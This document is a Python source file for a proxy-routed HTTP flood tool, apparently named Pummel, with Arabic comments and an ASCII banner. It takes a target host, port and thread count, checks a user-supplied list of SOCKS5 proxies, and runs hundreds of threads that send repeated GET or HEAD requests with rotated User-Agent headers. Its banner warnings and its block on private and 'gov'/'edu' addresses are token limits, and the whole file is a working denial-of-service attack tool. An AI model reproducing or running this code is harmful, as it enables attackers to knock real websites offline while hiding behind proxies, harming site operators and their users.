import os
import random
import time
import socket
import sys
import threading
import requests
import socks
import ssl

# واجهة المستخدم
print('''\r\n
██████╗ ██╗   ██╗███╗   ███╗███╗   ███╗███████╗██╗         
██╔══██╗██║   ██║████╗ ████║████╗ ████║██╔════╝██║         
██████╔╝██║   ██║██╔████╔██║██╔████╔██║█████╗  ██║         
██╔═══╝ ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██║         
██║     ╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗███████╗    
╚═╝      ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝   
┌─────────────────────────────────────────────────────┐
│ version 1.2.8                                       │
│                                                     │
│          [!!!Prevent Illegal CC-Attack!!!]          │                      
│                                                     │
│                               Code By HC the Chlous │
├─────────────────────────────────────────────────────┤
│       Github: https://github.com/HC133/Pummel	      │
│           [!]DO NOT ATTACK GOV WEBSITE[!]           │
└─────────────────────────────────────────────────────┘\r\n''')

# قائمة User-Agent
useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    # ... (أضف بقية الـ User-Agents هنا)
]

# قائمة Accept headers
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    # ... (أضف بقية الـ Accept headers هنا)
]

# دالة لمنع الهجمات على عناوين محددة
def prevent():
    if '192.168' in ip or '127.0' in ip or '172.16' in ip or 'localhost' in ip:
        print("Error: Invalid IP range!")
        sys.exit()
    if 'gov' in ip or 'edu' in ip:
        print("Error: Cannot attack .gov or .edu websites!")
        sys.exit()

# الدالة الرئيسية
def main():
    global ip, port, page, th_num, proxies, multiple, mode

    mode = input("Mode You Want To Choose (get/head): ").lower() or "get"
    if mode not in ["get", "head"]:
        print("Invalid mode! Using 'get' as default.")
        mode = "get"

    ip = input("Address/Host: ")
    prevent()

    page = input("Page (default=/): ") or "/"
    port = input("Port (default=80, HTTPS=443): ") or "80"
    port = int(port)

    th_num = input("Threads (default=300): ") or "300"
    th_num = int(th_num)

    # إدخال البروكسي يدويًا
    proxies = []
    print("Enter SOCKS5 proxies in the format IP:PORT (e.g., 127.0.0.1:1080).")
    print("Type 'done' when finished.")
    while True:
        proxy = input("Proxy: ")
        if proxy.lower() == "done":
            break
        if ":" in proxy:
            proxies.append(proxy.strip())
        else:
            print("Invalid format! Use IP:PORT.")

    print(f"Number of SOCKS5 Proxies: {len(proxies)}")

    if input("Check the SOCKS list? (y/n, default=y): ").lower() != "n":
        check_socks()

    multiple = input("Input the Multiple (default=100): ") or "100"
    multiple = int(multiple)

# دالة لإرسال طلبات GET
def get():
    while True:
        try:
            proxy = random.choice(proxies).strip().split(":")
            socks.set_default_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
            s = socks.socksocket()
            if port == 443:
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=ip)
            s.connect((ip, port))
            for _ in range(multiple):
                request = f"GET {page} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(useragents)}\r\n{random.choice(acceptall)}\r\n"
                s.send(request.encode())
            s.close()
        except Exception as e:
            pass

# دالة لإرسال طلبات HEAD
def head():
    while True:
        try:
            proxy = random.choice(proxies).strip().split(":")
            socks.set_default_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
            s = socks.socksocket()
            if port == 443:
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=ip)
            s.connect((ip, port))
            for _ in range(multiple):
                request = f"HEAD {page} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(useragents)}\r\n{random.choice(acceptall)}\r\n"
                s.send(request.encode())
            s.close()
        except Exception as e:
            pass

# دالة لفحص SOCKS proxies
def check_socks():
    global proxies
    working_proxies = []
    for proxy in proxies:
        try:
            proxy_ip, proxy_port = proxy.split(":")
            socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            s = socks.socksocket()
            s.settimeout(5)
            s.connect((ip, port))
            s.close()
            working_proxies.append(proxy)
        except:
            pass
    proxies = working_proxies
    print(f"Checked proxies. Working: {len(proxies)}")

# تشغيل البرنامج
if __name__ == "__main__":
    main()
    threads = []
    for _ in range(th_num):
        if mode == "get":
            t = threading.Thread(target=get)
        else:
            t = threading.Thread(target=head)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
